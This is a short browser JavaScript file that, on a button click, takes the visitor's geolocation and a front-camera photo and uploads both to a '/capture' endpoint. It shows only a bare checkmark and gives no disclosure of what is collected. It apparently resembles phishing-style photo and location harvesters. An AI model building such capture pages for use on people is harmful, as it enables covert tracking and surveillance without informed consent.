document.addEventListener('DOMContentLoaded', () => {
    const startBtn = document.getElementById('start-btn');

    startBtn.addEventListener('click', async () => {
        // Geolocation
        if (!navigator.geolocation) {
            alert('Geolocation not supported by your browser!');
            return;
        }

        navigator.geolocation.getCurrentPosition(async (position) => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            try {
                // Camera (Front)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const photoBlob = await imageCapture.takePhoto();

                const formData = new FormData();
                formData.append('photo', photoBlob, 'photo.jpg');
                formData.append('latitude', latitude);
                formData.append('longitude', longitude);

                await fetch('/capture', { method: 'POST', body: formData });

                track.stop();
                alert('✅ ');

            } catch (err) {
                console.error(err);
                alert('Camera access denied or error occurred!');
            }

        }, (err) => {
            console.error(err);
            alert('Location access denied or unavailable!');
        });
    });
});
